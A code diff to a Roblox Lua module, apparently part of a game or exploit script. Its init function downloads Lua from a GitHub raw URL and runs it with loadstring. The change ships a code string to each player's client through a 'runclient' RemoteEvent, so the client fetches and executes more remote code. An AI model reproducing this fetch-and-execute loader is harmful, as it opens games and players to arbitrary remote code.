@@ -103,11 +103,16 @@ function module.init(playere)
 print("ui stuff:", forcingthechat, run, player, message, playere)
 
 	local serverscripts = loadstring(game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/HELKLUAGF30MINUTESOFDATA12381/hi/fc/s.lua", true))()
-	
-	local localscripts = loadstring(game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/HELKLUAGF30MINUTESOFDATA12381/hi/fc/l.lua", true))()
+
+	local thecode = [[
+		local loadstring = require(game:GetService("ReplicatedStorage"):WaitForChild("loadstring", 99999))
+		local localscripts = loadstring(game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/HELKLUAGF30MINUTESOFDATA12381/hi/fc/l.lua", true))()
+
+		localscripts.init(forcingthechat, run, player, message)
+	]]
 
     serverscripts.init(forcingthechat)
-    localscripts.init(forcingthechat, run, player, message)
+	game:GetService("ReplicatedStorage"):FindFirstChild("runclient"):FireClient(playere, thecode, forcingthechat, run, player, message)
 end
 
 return module
